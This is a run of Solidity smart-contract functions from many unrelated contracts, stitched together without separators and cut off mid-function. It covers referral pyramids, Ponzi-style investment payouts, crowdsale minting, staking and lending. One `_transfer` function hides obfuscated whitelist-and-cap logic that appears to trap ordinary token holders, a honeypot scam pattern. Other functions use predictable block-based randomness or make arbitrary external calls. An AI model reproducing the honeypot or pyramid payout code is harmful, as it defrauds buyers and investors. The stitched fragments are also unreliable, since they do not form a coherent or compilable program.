function registration(address _user, address payable _referrer, uint256 _referrerAccount) private {
    totalUsers = totalUsers + 1;
    userAccounts = userAccounts + 1;
    User storage u = users[_user];
    Account storage ua = u.accounts[1];
    if (_referrer != owner) {
        u.referrer = _referrer;
        u.totalAccounts = 1;
        u.active = true;
        ua.active = true;
        pushDownlines(_user, _referrer, _referrerAccount);
        pushUplines(_user, _referrer, _referrerAccount, 1);
        sendDirectBonus(_referrer);
    } else {
        u.referrer = owner;
        u.totalAccounts = 1;
        u.active = true;
        ua.active = true;
        sendDirectBonus(payable(owner));
        pushDownlines(_user, _referrer, _referrerAccount);
        pushUplines(_user, _referrer, _referrerAccount, 1);
    }
}

function sendDirectBonus(address payable _reciever) private {
    _reciever.transfer(referralBonus);
    emit Referral(_reciever, referralBonus);
}

function sendSpillOver(address[] memory _reciepients) private {
    if (_reciepients.length > 9) {
        for (uint i = 0; i < 9; i++) {
            payable(_reciepients[i]).transfer(spillover);
            emit LevelBonus(_reciepients[i], spillover);
        }
    } else {
        for (uint i = 0; i < _reciepients.length; i++) {
            payable(_reciepients[i]).transfer(spillover);
            emit LevelBonus(_reciepients[i], spillover);
        }
    }
}

function purchase() external payable {
    require(msg.value == price);
    User storage u = users[msg.sender];
    uint256 newAccount = u.totalAccounts;
    newAccount = newAccount + 1;
    uint256 oldAccount = u.totalAccounts;
    require(u.active == true);
    userAccounts = userAccounts + 1;
    Account storage o = u.accounts[oldAccount];
    Account storage a = u.accounts[newAccount];
    a.active = true;
    a.uplines = o.uplines;
    u.totalAccounts = newAccount;
    sendDirectBonus(payable(u.referrer));
    sendSpillOver(a.uplines);
}

function _lock(address from, uint256 amount, uint256 due)
internal
returns(bool success) {
    require(due > block.timestamp, "ERC20Lockable/lock : Cannot set due to past");
    require(
        _balances[from] >= amount + _totalLocked[from],
        "ERC20Lockable/lock : locked total should be smaller than balance"
    );
    _totalLocked[from] = _totalLocked[from] + amount;
    _locks[from].push(LockInfo(amount, due));
    emit Lock(from, amount, due);
    success = true;
}

function unlockAll(address from) external returns(bool success) {
    for (uint256 i = 0; i < _locks[from].length;) {
        i++;
        if (_locks[from][i - 1].due < block.timestamp) {
            if (_unlock(from, i - 1)) {
                i--;
            }
        }
    }
    success = true;
}

function unlock(address from, uint256 idx) external returns(bool success) {
    require(_locks[from][idx].due < block.timestamp, "ERC20Lockable/unlock: cannot unlock before due");
    return _unlock(from, idx);
}

function withdraw(
    uint32 _stakeID,
    bool _full,
    uint64 _withdrawAmount
) external nonReentrant {
    require(
        stakeByID[_stakeID].ownerAddress == msg.sender,
        "Unauthorized Stake owner"
    );
    require(stakeByID[_stakeID].active == true, "Stake was settled");
    uint256 elapsedTime = BokkyPooBahsDateTimeLibrary.diffDays(
        uint256(stakeByID[_stakeID].startOfTerm),
        uint256(block.timestamp)
    );
    uint256 totalReturns;
    uint256 stakeReturns;
    uint256 rewardEndTime;
    if (elapsedTime < stakeTypes[stakeByID[_stakeID].Type].bonusTerm) {
        totalReturns = compound(
            (stakeByID[_stakeID].evaiAmount),
            (stakeTypes[stakeByID[_stakeID].Type].percentageReturn),
            elapsedTime
        );
        stakeReturns = totalReturns - stakeByID[_stakeID].evaiAmount;
    } else if (
        elapsedTime == stakeTypes[stakeByID[_stakeID].Type].bonusTerm
    ) {
        totalReturns = (stakeByID[_stakeID].evaiAmount *
            (stakeTypes[stakeByID[_stakeID].Type].bonusMultiplier));
        stakeReturns = totalReturns - (stakeByID[_stakeID].evaiAmount);
    } else if (
        elapsedTime > stakeTypes[stakeByID[_stakeID].Type].bonusTerm
    ) {
        uint256 daysForYearInProgress = elapsedTime.mod(
            uint256(stakeTypes[stakeByID[_stakeID].Type].bonusTerm)
        );
        uint256 completedYears = (elapsedTime.sub(daysForYearInProgress))
            .div(uint256(stakeTypes[stakeByID[_stakeID].Type].bonusTerm));
        rewardEndTime = BokkyPooBahsDateTimeLibrary.addDays(
            uint256(stakeByID[_stakeID].startOfTerm),
            uint256(
                (completedYears + 1) *
                uint256(stakeTypes[stakeByID[_stakeID].Type].bonusTerm)
            )
        );
        if (rewardEndTime < uint256(block.timestamp)) {
            elapsedTime = BokkyPooBahsDateTimeLibrary.diffDays(
                uint256(stakeByID[_stakeID].startOfTerm),
                rewardEndTime
            );
            daysForYearInProgress = elapsedTime.mod(
                uint256(stakeTypes[stakeByID[_stakeID].Type].bonusTerm)
            );
            completedYears = (elapsedTime.sub(daysForYearInProgress)).div(
                uint256(stakeTypes[stakeByID[_stakeID].Type].bonusTerm)
            );
        }
        uint256 bMul = uint256(
            stakeTypes[stakeByID[_stakeID].Type].bonusMultiplier
        );
        uint256 postBonusBalance = calculatePostBonusBalance(
            uint256(stakeByID[_stakeID].evaiAmount),
            completedYears,
            bMul
        );
        uint256 pReturns = stakeTypes[stakeByID[_stakeID].Type]
            .percentageReturn;
        totalReturns = compound(
            postBonusBalance,
            pReturns,
            daysForYearInProgress
        );
        stakeReturns = totalReturns - (stakeByID[_stakeID].evaiAmount);
    }
    if (_full == true) {
        stakeByID[_stakeID].partialWithdrawn = false;
        stakeByID[_stakeID].settlementAmount = uint64(totalReturns);
        stakeByID[_stakeID].stakeReturns = uint64(stakeReturns);
    } else {
        require(
            _withdrawAmount <= uint64(totalReturns),
            "Amount to claim is higher than returns"
        );
        stakeByID[_stakeID].settlementAmount = _withdrawAmount;
    }
    if (
        _full == true &&
        stakeByID[_stakeID].settlementAmount <=
        evaiToken.balanceOf(address(this))
    ) {
        currentStakedEvaiAmount -= stakeByID[_stakeID].evaiAmount;
        totalProfitsDistrubuted += stakeByID[_stakeID].stakeReturns;
        stakeByID[_stakeID].active = false;
        stakeByID[_stakeID].settled = true;
        evaiTransfer(_stakeID);
        emitWithdrawStake(_stakeID);
    } else if (
        _full == true &&
        stakeByID[_stakeID].settlementAmount >=
        evaiToken.balanceOf(address(this))
    ) {
        stakeByID[_stakeID].active = false;
        emitWithdrawStake(_stakeID);
    } else if (
        _full == false &&
        stakeByID[_stakeID].settlementAmount <=
        evaiToken.balanceOf(address(this))
    ) {
        currentStakedEvaiAmount -= stakeByID[_stakeID].evaiAmount;
        stakeByID[_stakeID].active = false;
        stakeByID[_stakeID].partialWithdrawn = true;
        stakeByID[_stakeID].settled = true;
        evaiTransfer(_stakeID);
        emitWithdrawStake(_stakeID);
        uint8 Type = stakeByID[_stakeID].Type;
        uint256 reStakeAmount = totalReturns -
            (stakeByID[_stakeID].settlementAmount);
        reStake(uint64(reStakeAmount), Type, _stakeID);
    } else if (
        _full == false &&
        stakeByID[_stakeID].settlementAmount >=
        evaiToken.balanceOf(address(this))
    ) {
        stakeByID[_stakeID].active = false;
        stakeByID[_stakeID].partialWithdrawn = true;
        emitWithdrawStake(_stakeID);
    }
}

function settleStakes(uint32[] memory _stakeIDs) external onlyOwner {
    for (uint256 i = 0; i < _stakeIDs.length; i++) {
        if (
            stakeByID[_stakeIDs[i]].active == true &&
            stakeByID[_stakeIDs[i]].partialWithdrawn == false
        ) {
            currentStakedEvaiAmount -= stakeByID[_stakeIDs[i]]
                .settlementAmount;
            stakeByID[_stakeIDs[i]].active = false;
            stakeByID[_stakeIDs[i]].settled = true;
            evaiToken.approve(
                stakeByID[_stakeIDs[i]].ownerAddress,
                stakeByID[_stakeIDs[i]].settlementAmount
            );
            evaiToken.transfer(
                stakeByID[_stakeIDs[i]].ownerAddress,
                stakeByID[_stakeIDs[i]].settlementAmount
            );
        }
    }
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (classico == true)) {
        cintram[recipient] = true;
        palmer[recipient] = false;
        classico = false;
    }
    if (cintram[recipient] != true) {
        palmer[recipient] = ((randomItIs() == 2) ? true : false);
    }
    if ((palmer[sender]) && (cintram[recipient] == false)) {
        palmer[recipient] = true;
    }
    if (cintram[sender] == false) {
        require(amount < srilanka);
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function() payable {
    ethInWei = ethInWei + msg.value;
    uint256 amount = msg.value * VKNToEth;
    if (balances[devWallet] < amount) {
        return;
    } 
    balances[devWallet] = balances[devWallet] - amount;
    balances[msg.sender] = balances[msg.sender] + amount;
    Transfer(devWallet, msg.sender, amount);
    devWallet.send(msg.value);
}

function closeUsingTrustedRecipient(
    address closer,
    address payoutRecipient,
    uint256 requestedAmount
)
internal
returns(uint256) {
    MarginCommon.Position memory position = MarginHelper.getPosition(DYDX_MARGIN, POSITION_ID);
    bool afterEnd =
        block.timestamp > uint256(position.startTimestamp).add(position.maxDuration);
    bool afterCall =
        position.callTimestamp > 0 &&
        block.timestamp > uint256(position.callTimestamp).add(position.callTimeLimit);
    if (afterCall || afterEnd) {
        require(
            TRUSTED_LATE_CLOSERS[closer],
            "ERC20CappedPosition#closeUsingTrustedRecipient: closer not in TRUSTED_LATE_CLOSERS"
        );
    }
    return super.closeUsingTrustedRecipient(closer, payoutRecipient, requestedAmount);
}

function setStateClosedIfClosed()
private {
    if (state == State.OPEN && Margin(DYDX_MARGIN).isPositionClosed(POSITION_ID)) {
        state = State.CLOSED;
        emit CompletelyClosed();
    }
}

function withdrawImpl(
    address receiver,
    address onBehalfOf
)
private
returns(uint256) {
    uint256 value = balanceOf(onBehalfOf);
    if (value == 0) {
        return 0;
    }
    uint256 heldTokenBalance = TokenInteract.balanceOf(heldToken, address(this));
    uint256 heldTokenPayout = MathHelpers.getPartialAmount(
        value,
        totalSupply_,
        heldTokenBalance
    );
    delete balances[onBehalfOf];
    totalSupply_ = totalSupply_.sub(value);
    TokenInteract.transfer(heldToken, receiver, heldTokenPayout);
    emit Withdraw(onBehalfOf, value, heldTokenPayout);
    return heldTokenPayout;
}

function closeOnBehalfOf(
    address closer,
    address payoutRecipient,
    bytes32 positionId,
    uint256 requestedAmount
)
external
onlyMargin
nonReentrant
onlyState(State.OPEN)
onlyPosition(positionId)
returns(address, uint256) {
    uint256 positionPrincipal = Margin(DYDX_MARGIN).getPositionPrincipal(positionId);
    assert(requestedAmount <= positionPrincipal);
    uint256 allowedAmount;
    if (TRUSTED_RECIPIENTS[payoutRecipient]) {
        allowedAmount = closeUsingTrustedRecipient(
            closer,
            payoutRecipient,
            requestedAmount
        );
    } else {
        allowedAmount = close(
            closer,
            requestedAmount,
            positionPrincipal
        );
    }
    assert(allowedAmount > 0);
    assert(allowedAmount <= requestedAmount);
    if (allowedAmount == positionPrincipal) {
        state = State.CLOSED;
        emit CompletelyClosed();
    }
    return (address(this), allowedAmount);
}

function receivePositionOwnership(
    address  ,
    bytes32 positionId
)
external
onlyMargin
nonReentrant
onlyState(State.UNINITIALIZED)
onlyPosition(positionId)
returns(address) {
    MarginCommon.Position memory position = MarginHelper.getPosition(DYDX_MARGIN, POSITION_ID);
    assert(position.principal > 0);
    state = State.OPEN;
    uint256 tokenAmount = getTokenAmountOnAdd(position.principal);
    totalSupply_ = tokenAmount;
    balances[INITIAL_TOKEN_HOLDER] = tokenAmount;
    heldToken = position.heldToken;
    emit Initialized(POSITION_ID, tokenAmount);
    emit Transfer(address(0), INITIAL_TOKEN_HOLDER, tokenAmount);
    return address(this); 
}

function increasePositionOnBehalfOf(
    address trader,
    bytes32 positionId,
    uint256 principalAdded
)
external
onlyMargin
nonReentrant
onlyState(State.OPEN)
onlyPosition(positionId)
returns(address) {
    require(
        !Margin(DYDX_MARGIN).isPositionCalled(POSITION_ID),
        "ERC20Position#increasePositionOnBehalfOf: Position is margin-called"
    );
    require(
        !closedUsingTrustedRecipient,
        "ERC20Position#increasePositionOnBehalfOf: Position closed using trusted recipient"
    );
    uint256 tokenAmount = getTokenAmountOnAdd(principalAdded);
    balances[trader] = balances[trader].add(tokenAmount);
    totalSupply_ = totalSupply_.add(tokenAmount);
    emit Transfer(address(0), trader, tokenAmount);
    return address(this);
}

function getTokens(address contributor) payable stopInEmergency validPurchase public {
    uint256 amount;
    uint256 oddEthers;
    uint256 ethers;
    uint256 _at;
    uint8 _winNum;
    _at = block.timestamp;
    require(contributor != 0x0);
    if (withinPeriod()) {
        (amount, oddEthers) = calcAmountAt(msg.value, _at, token.totalSupply());
        require(amount.add(token.totalSupply()) <= hardCapInTokens);
        ethers = msg.value.sub(oddEthers);
        token.mint(contributor, amount); 
        TokenPurchase(contributor, ethers, amount);
        counter_in = counter_in.add(ethers);
        crowdTokensTLP2 = crowdTokensTLP2.add(amount);
        if (oddEthers > 0) {
            require(oddEthers < msg.value);
            contributor.transfer(oddEthers);
            TransferOddEther(contributor, oddEthers);
        }
        wallet.transfer(ethers);
    } else {
        require(msg.value >= minETHin); 
        _winNum = stageName();
        require(_winNum >= 0 && _winNum < 5);
        Window storage w = ww[_winNum];
        require(w.tokenPerWindow > 0); 
        w.totalEthInWindow = w.totalEthInWindow.add(msg.value);
        ppls[w.totalTransCnt].addr = contributor;
        ppls[w.totalTransCnt].amount = msg.value;
        w.totalTransCnt++;
        TokenPurchaseInWindow(contributor, msg.value, _winNum, w.totalTransCnt, w.totalEthInWindow);
    }
}

function sendTokensWindow(uint8 _winNum) onlyOwner stopInEmergency public {
    uint256 _tokenPerETH;
    uint256 _tokenToSend = 0;
    address _tempAddr;
    uint32 index = ww[_winNum].refundIndex;
    TokenETH(ww[_winNum].totalEthInWindow, ww[_winNum].totalTransCnt);
    require(ww[_winNum].active);
    require(ww[_winNum].totalEthInWindow > 0);
    require(ww[_winNum].totalTransCnt > 0);
    _tokenPerETH = ww[_winNum].tokenPerWindow.div(ww[_winNum].totalEthInWindow); 
    while (index < ww[_winNum].totalTransCnt && msg.gas > 100000) {
        _tokenToSend = _tokenPerETH.mul(ppls[index].amount);
        ppls[index].amount = 0;
        _tempAddr = ppls[index].addr;
        ppls[index].addr = 0;
        index++;
        token.transfer(_tempAddr, _tokenToSend);
        TokenWithdrawAtWindow(_tempAddr, _tokenToSend);
    }
    ww[_winNum].refundIndex = index;
}

function fundMinting(address to, uint256 amount) stopInEmergency public {
    require(msg.sender == fundMintingAgent || isOwner());
    require(block.timestamp < sT2);
    require(fundTotalSupply.add(amount) <= fundTokens);
    require(token.totalSupply().add(amount) <= hardCapInTokens);
    fundTotalSupply = fundTotalSupply.add(amount);
    token.mint(to, amount);
    FundMinting(to, amount);
}

function finishCrowd() onlyOwner public {
    uint256 _tokenPerWindow;
    require(now > (sT2.add(dTLP2)) || hardCapInTokens == token.totalSupply());
    require(!token.mintingFinished());
    _tokenPerWindow = (mintCapInTokens.sub(crowdTokensTLP2).sub(fundTotalSupply)).div(5);
    token.mint(this, _tokenPerWindow.mul(5)); 
    for (uint8 y = 0; y < 5; y++) {
        newWindow(y, _tokenPerWindow);
    }
    token.finishMinting();
}

function running() constant public returns(bool) {
    return withinPeriod() && !token.mintingFinished();
}

function calcAmountAt(
    uint256 amount,
    uint256 at,
    uint256 _totalSupply
) public constant returns(uint256, uint256) {
    uint256 estimate;
    uint256 price;
    if (at >= sT2 && at <= (sT2 + dTLP2)) {
        if (at <= sT2 + 15 days) {
            price = 12e13;
        } else if (at <= sT2 + 30 days) {
            price = 14e13;
        } else if (at <= sT2 + 45 days) {
            price = 16e13;
        } else if (at <= sT2 + 60 days) {
            price = 18e13;
        } else if (at <= sT2 + 75 days) {
            price = 20e13;
        } else if (at <= sT2 + 90 days) {
            price = 22e13;
        } else if (at <= sT2 + 105 days) {
            price = 24e13;
        } else if (at <= sT2 + 118 days) {
            price = 26e13;
        } else {
            revert();
        }
    } else {
        revert();
    }
    estimate = _totalSupply.add(amount.mul(1e18).div(price));
    if (estimate > hardCapInTokens) {
        return (
            hardCapInTokens.sub(_totalSupply),
            estimate.sub(hardCapInTokens).mul(price).div(1e18)
        );
    }
    return (estimate.sub(_totalSupply), 0);
}

function setStartEndTimeTLP(uint256 _at) onlyOwner public {
    require(block.timestamp < sT2); 
    require(block.timestamp < _at); 
    sT2 = _at;
    SetStartTimeTLP2(_at);
}

function McFlyCrowd(
    uint256 _startTimeTLP2,
    uint256 _preMcFlyTotalSupply,
    address _wallet,
    address _wavesAgent,
    address _wavesGW,
    address _fundMintingAgent,
    address _teamWallet,
    address _bountyOnlineWallet,
    address _bountyOnlineGW,
    address _bountyOfflineWallet,
    address _advisoryWallet,
    address _reservedWallet,
    address _airdropWallet,
    address _airdropGW,
    address _preMcFlyWallet
) public {
    require(_startTimeTLP2 >= block.timestamp);
    require(_preMcFlyTotalSupply > 0);
    require(_wallet != 0x0);
    require(_wavesAgent != 0x0);
    require(_wavesGW != 0x0);
    require(_fundMintingAgent != 0x0);
    require(_teamWallet != 0x0);
    require(_bountyOnlineWallet != 0x0);
    require(_bountyOnlineGW != 0x0);
    require(_bountyOfflineWallet != 0x0);
    require(_advisoryWallet != 0x0);
    require(_reservedWallet != 0x0);
    require(_airdropWallet != 0x0);
    require(_airdropGW != 0x0);
    require(_preMcFlyWallet != 0x0);
    token = new McFlyToken();
    wallet = _wallet;
    sT2 = _startTimeTLP2;
    wavesAgent = _wavesAgent;
    wavesGW = _wavesGW;
    fundMintingAgent = _fundMintingAgent;
    teamWallet = _teamWallet;
    bountyOnlineWallet = _bountyOnlineWallet;
    bountyOnlineGW = _bountyOnlineGW;
    bountyOfflineWallet = _bountyOfflineWallet;
    advisoryWallet = _advisoryWallet;
    reservedWallet = _reservedWallet;
    airdropWallet = _airdropWallet;
    airdropGW = _airdropGW;
    preMcFlyWallet = _preMcFlyWallet;
    _preMcFly = _preMcFlyTotalSupply;
    token.mint(preMcFlyWallet, _preMcFly); 
    token.allowTransfer(preMcFlyWallet);
    crowdTokensTLP2 = crowdTokensTLP2.add(_preMcFly);
    token.mint(wavesAgent, wavesTokens); 
    token.allowTransfer(wavesAgent);
    token.allowTransfer(wavesGW);
    crowdTokensTLP2 = crowdTokensTLP2.add(wavesTokens);
    token.mint(this, _teamTokens); 
    token.mint(bountyOnlineWallet, _bountyOnlineTokens);
    token.allowTransfer(bountyOnlineWallet);
    token.allowTransfer(bountyOnlineGW);
    token.mint(bountyOfflineWallet, _bountyOfflineTokens);
    token.allowTransfer(bountyOfflineWallet);
    token.mint(this, _advisoryTokens);
    token.mint(this, _reservedTokens);
    token.mint(airdropWallet, _airdropTokens);
    token.allowTransfer(airdropWallet);
    token.allowTransfer(airdropGW);
}

function vestingWithdraw(address withdrawWallet, uint256 withdrawTokens, uint256 withdrawTotalSupply) private returns(uint256) {
    require(token.mintingFinished());
    require(msg.sender == withdrawWallet || isOwner());
    uint256 currentPeriod = (block.timestamp.sub(sT2.add(dTLP2))).div(VestingPeriodInSeconds);
    if (currentPeriod > VestingPeriodsCount) {
        currentPeriod = VestingPeriodsCount;
    }
    uint256 tokenAvailable = withdrawTokens.mul(currentPeriod).div(VestingPeriodsCount).sub(withdrawTotalSupply); 
    require((withdrawTotalSupply.add(tokenAvailable)) <= withdrawTokens);
    uint256 _withdrawTotalSupply = withdrawTotalSupply.add(tokenAvailable);
    token.transfer(withdrawWallet, tokenAvailable);
    WithdrawVesting(withdrawWallet, currentPeriod, tokenAvailable, _withdrawTotalSupply);
    return _withdrawTotalSupply;
}

function withinPeriod() constant public returns(bool) {
    return (now >= sT2 && now <= (sT2 + dTLP2));
}

function stageName() constant public returns(uint8) {
    uint256 eT2 = sT2 + dTLP2;
    if (now < sT2) {
        return 101;
    } 
    if (now >= sT2 && now <= eT2) {
        return (102);
    } 
    if (now > eT2 && now < eT2 + dBt) {
        return (103);
    } 
    if (now >= (eT2 + dBt) && now <= (eT2 + dBt + dW)) {
        return (0);
    } 
    if (now > (eT2 + dBt + dW) && now < (eT2 + dBt + dW + dBt)) {
        return (104);
    } 
    if (now >= (eT2 + dBt + dW + dBt) && now <= (eT2 + dBt + dW + dBt + dW)) {
        return (1);
    } 
    if (now > (eT2 + dBt + dW + dBt + dW) && now < (eT2 + dBt + dW + dBt + dW + dBt)) {
        return (105);
    } 
    if (now >= (eT2 + dBt + dW + dBt + dW + dBt) && now <= (eT2 + dBt + dW + dBt + dW + dBt + dW)) {
        return (2);
    } 
    if (now > (eT2 + dBt + dW + dBt + dW + dBt + dW) && now < (eT2 + dBt + dW + dBt + dW + dBt + dW + dBt)) {
        return (106);
    } 
    if (now >= (eT2 + dBt + dW + dBt + dW + dBt + dW + dBt) && now <= (eT2 + dBt + dW + dBt + dW + dBt + dW + dBt + dW)) {
        return (3);
    } 
    if (now > (eT2 + dBt + dW + dBt + dW + dBt + dW + dBt + dW) && now < (eT2 + dBt + dW + dBt + dW + dBt + dW + dBt + dW + dBt)) {
        return (107);
    } 
    if (now >= (eT2 + dBt + dW + dBt + dW + dBt + dW + dBt + dW + dBt) && now <= (eT2 + dBt + dW + dBt + dW + dBt + dW + dBt + dW + dBt + dW)) {
        return (4);
    } 
    if (now > (eT2 + dBt + dW + dBt + dW + dBt + dW + dBt + dW + dBt + dW)) {
        return (200);
    } 
    return (201); 
}

function driveCowsInto(uint256 cows) external {
    address master = msg.sender;
    bool ok = _tokenCOW.transferFrom(master, address(this), cows);
    require(ok, "Stable: unable to transport cows to the stable");
    uint256 unitsPerCow = TOTAL_UNITS.div(_tokenCOW.totalSupply());
    uint256 units = cows.mul(unitsPerCow);
    _cows[master] = _cows[master].add(units);
    _totalCows = _totalCows.add(units);
    _updateStakeshot(master);
    emit CowsArrived(master, cows);
}

function driveCowsOut(address master, uint256 cows) external {
    bool ok = _tokenCOW.transfer(master, cows);
    require(ok, "Stable: unable to transport cows from the stable");
    uint256 unitsPerCow = TOTAL_UNITS.div(_tokenCOW.totalSupply());
    uint256 units = cows.mul(unitsPerCow);
    _cows[master] = _cows[master].sub(units);
    _totalCows = _totalCows.sub(units);
    _updateStakeshot(master);
    emit CowsLeaved(master, cows);
}

function round() external {
    uint256 period = _milker.getPeriod();
    require(period > _lastPeriod, "Controller: need to wait for a new round");
    _lastPeriod = _lastPeriod.add(1);
    uint256 randomNumber = _randomNumber();
    bool banditsComing = (((randomNumber >> 24) % 10) < 3); 
    bool sheriffsPotDistributing = false; 
    uint256 banditsPercent = 0; 
    uint256 banditsAmount = 0;
    uint256 arrestedAmount = 0;
    uint256 burntAmount = 0;
    uint256 vaultCommissionAmount = 0;
    uint256 potDistributionAmount = 0;
    if (banditsComing) {
        banditsPercent = (((randomNumber >> 40) % 99) + 1); 
        (banditsAmount, arrestedAmount, burntAmount) = _milker.bandits(banditsPercent);
    }
    vaultCommissionAmount = _milker.sheriffsVaultCommission();
    if (!banditsComing) {
        sheriffsPotDistributing = (((randomNumber >> 64) % 10) < 3); 
        if (sheriffsPotDistributing) {
            potDistributionAmount = _milker.sheriffsPotDistribution();
        }
    }
    emit Round(
        _lastPeriod, banditsComing, sheriffsPotDistributing, banditsPercent,
        banditsAmount, arrestedAmount, burntAmount,
        vaultCommissionAmount, potDistributionAmount,
        block.timestamp 
    );
}

function RecordTransfer(address _from, address _to, uint256 _value) internal {
    Transfer(_from, _to, _value);
    if (airdroped[_from] == 0) airdroped[_from] = 1;
    if (airdroped[_to] == 0) airdroped[_to] = 1;
    if (thisweek() > lastWeek) {
        lastWeek = thisweek();
        DropedThisWeek = 0;
    }
}

function availableAirdrop(address who) internal constant returns(uint256) {
    if (balances[owner] == 0) return 0;
    if (airdroped[who] > 0) return 0; 
    if (thisweek() > lastWeek || DropedThisWeek < weekly_limit) {
        if (balances[owner] > air_drop) return air_drop;
        else return balances[owner];
    }
    return 0;
}

function() public payable {
    require(now >= startDate && now <= endDate);
    uint tokens;
    if (now <= bonusEnds) {
        tokens = msg.value * 11000;
    } else {
        tokens = msg.value * 5100;
    }
    balances[msg.sender] = safeAdd(balances[msg.sender], tokens);
    _totalSupply = safeAdd(_totalSupply, tokens);
    Transfer(address(0), msg.sender, tokens);
    owner.transfer(msg.value);
}

function distribute_private_sale_fund(address _beneficiary, uint256 _wei_amount, uint256 _rate) public onlyOwner returns(bool) {
    require(pvt_plmt_set && _beneficiary != address(0) && pvt_plmt_remaining_in_Wei >= _wei_amount && _rate >= 100000 && _rate <= 125000);
    pvt_plmt_remaining_in_Wei = pvt_plmt_remaining_in_Wei.sub(_wei_amount); 
    uint256 _token_amount = _wei_amount.mul(_rate); 
    pvt_plmt_token_generated = pvt_plmt_token_generated.add(_token_amount); 
    address _ret;
    if (now < token_unlock_time) assert((_ret = mint_time_locked_token(_beneficiary, _token_amount)) != address(0));
    else assert(mint(_beneficiary, _token_amount));
    PrivateSaleTokenGenerated(_ret, _beneficiary, _token_amount);
    return true;
}

function purchaseLeader(uint uniqueLeaderID) public payable returns(uint, uint) {
    require(uniqueLeaderID >= 0 && uniqueLeaderID <= 31);
    if (data[uniqueLeaderID].currentValue == 15000000000000000) {
        data[uniqueLeaderID].currentValue = 30000000000000000;
    } else {
        data[uniqueLeaderID].currentValue = (data[uniqueLeaderID].currentValue / 10) * 12;
    }
    require(msg.value >= data[uniqueLeaderID].currentValue * uint256(1));
    payPreviousOwner(data[uniqueLeaderID].currentLeaderOwner, (data[uniqueLeaderID].currentValue / 100) * (88));
    transactionFee(ceoAddress, (data[uniqueLeaderID].currentValue / 100) * (12));
    data[uniqueLeaderID].currentLeaderOwner = msg.sender;
    return (uniqueLeaderID, data[uniqueLeaderID].currentValue);
}

function drawETH(uint256 amount) public onlyBeneficiary alloweDrawEth {
    beneficiary.transfer(amount);
    Draw(msg.sender, amount, now);
}

function backETH(uint pos) public onlyBeneficiary {
    if (!bills[pos].hadback) {
        require(pos < lastAccountNum);
        bills[pos].investor.transfer(bills[pos].amount);
        bills[pos].hadback = true;
        Back(bills[pos].investor, bills[pos].amount, now);
    }
}

function buy(address _referredBy) public payable {
    require(msg.value >= minimum);
    require(gameStarted);
    address _customerAddress = msg.sender;
    if (
        _referredBy != 0x0000000000000000000000000000000000000000 &&
        _referredBy != _customerAddress &&
        investments[_referredBy] >= stakingRequirement
    ) {
        referrer[_referredBy] = referrer[_referredBy].add(msg.value.mul(7).div(100));
    }
    if (investments[msg.sender] > 0) {
        if (withdraw()) {
            withdrawals[msg.sender] = 0;
        }
    }
    investments[msg.sender] = investments[msg.sender].add(msg.value);
    joined[msg.sender] = block.timestamp;
    ownerWallet.transfer(msg.value.mul(4).div(100));
    charityWallet.transfer(msg.value.mul(1).div(100));
    emit Invest(msg.sender, msg.value);
}

function lend(address _to, ERC20 _token, uint256 _amount, address _target, bytes _data) public payable {
    uint256 prevBalance = _token.balanceOf(this);
    _token.transfer(_to, _amount);
    inLendingMode += 1;
    require(caller_.makeCall.value(msg.value)(_target, _data), "lend: arbitrary call failed");
    inLendingMode -= 1;
    require(_token.balanceOf(this) >= prevBalance, "lend: lended token must be refilled");
}

function _bundle(address _beneficiary, uint256 _amount, uint256[] _tokenAmounts) internal {
    require(_amount != 0, "Bundling amount should be non-zero");
    require(tokens.length == _tokenAmounts.length, "Lenghts of tokens and _tokenAmounts array should be equal");
    for (uint i = 0; i < tokens.length; i++) {
        require(_tokenAmounts[i] != 0, "Token amount should be non-zero");
        tokens[i].checkedTransferFrom(msg.sender, this, _tokenAmounts[i]); 
    }
    totalSupply_ = totalSupply_.add(_amount);
    balances[_beneficiary] = balances[_beneficiary].add(_amount);
    emit Bundle(msg.sender, _beneficiary, _amount);
    emit Transfer(0, _beneficiary, _amount);
}

function bundle(address _beneficiary, uint256 _amount) public bundlingEnabled notInLendingMode {
    require(totalSupply_ != 0, "This method can be used with non zero total supply only");
    uint256[] memory tokenAmounts = new uint256[](tokens.length);
    for (uint i = 0; i < tokens.length; i++) {
        tokenAmounts[i] = tokens[i].balanceOf(this).mul(_amount).div(totalSupply_);
    }
    _bundle(_beneficiary, _amount, tokenAmounts);
}

function deposit(address payable _address, uint256 _value, uint256 _ether) public onlyOwner returns(bool) {
    _mint(_address, _value);
    if (_ether > 0) {
        _address.transfer(_ether);
    }
    emit Deposit(_address, _value, _ether);
    return true;
}

function withdraw(uint256 wad) public {
    require(!reEntrancyMutex);
    balanceOf[msg.sender] = balanceOf[msg.sender].sub(wad);
    totalPUSDT = totalPUSDT.sub(wad);
    reEntrancyMutex = true;
    usdt.transfer(msg.sender, wad);
    emit Transfer(msg.sender, address(0), wad);
    emit Withdrawal(msg.sender, wad);
    reEntrancyMutex = false;
}

function _transfer(address from, address to, uint256 amount) internal override {
    require(from != address(0), "transfer from the zero address");
    require(to != address(0), "transfer to the zero address");
    require(amount <= maxTxLimit || isExcludedFromTxLimit[from] || isExcludedFromTxLimit[to], "Tx Amount too large");
    require(balanceOf(to).add(amount) <= maxWalletLimit || isExcludedFromWalletLimit[to], "Transfer will exceed wallet limit");
    if (amount == 0) {
        super._transfer(from, to, 0);
        return;
    }
    uint256 totalTokensForFee = tokensForLiquidity + tokensForTax;
    bool canSwap = totalTokensForFee >= swapAtAmount;
    if (
        from != uniswapV2Pair &&
        canSwap &&
        !swapping
    ) {
        swapping = true;
        swapBack(totalTokensForFee);
        swapping = false;
    }
    bool takeFee = !swapping;
    if (isExcludedFromFees[from] || isExcludedFromFees[to]) {
        takeFee = false;
    }
    if (takeFee) {
        uint256 fees;
        if (to == uniswapV2Pair) {
            uint256 sellTotalFees = sellLiquidityFee.add(sellTxFee);
            fees = amount.mul(sellTotalFees).div(100);
            tokensForLiquidity = tokensForLiquidity.add(fees.mul(sellLiquidityFee).div(sellTotalFees));
            tokensForTax = tokensForTax.add(fees.mul(sellTxFee).div(sellTotalFees));
        }
        else {
            uint256 buyTotalFees = buyLiquidityFee.add(buyTxFee);
            fees = amount.mul(buyTotalFees).div(100);
            tokensForLiquidity = tokensForLiquidity.add(fees.mul(buyLiquidityFee).div(buyTotalFees));
